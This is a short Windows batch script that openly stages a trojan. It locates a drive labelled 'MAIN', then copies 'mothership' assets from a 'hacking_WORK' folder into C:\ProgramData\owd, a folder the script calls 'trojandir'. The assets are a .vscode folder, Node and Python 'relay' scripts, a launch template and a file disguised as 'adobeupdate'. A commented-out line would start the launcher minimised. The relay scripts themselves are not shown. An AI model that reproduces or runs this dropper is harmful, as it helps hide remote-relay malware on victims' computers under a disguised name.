FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

set mothership=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
set trojandir=C:\ProgramData\owd
cd /d %trojandir%

mkdir %trojandir%\.vscode

copy /y %mothership%\.vscode\*.* %trojandir%\.vscode 

copy /y %mothership%\nodehostrelay.cmdslist.js %trojandir%
copy /y %mothership%\nodehostrelayhelper.js %trojandir%
copy /y %mothership%\nodehostrelay.js %trojandir% 
copy /y %mothership%\pythonrelay.py %trojandir%
copy /y %mothership%\pythonhostrelay.py %trojandir%
copy /y %mothership%\tpl_launch.cmd %trojandir%
copy /y %mothership%\adobeupdate %trojandir%

REM copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd .
REM start "" /min launch.cmd
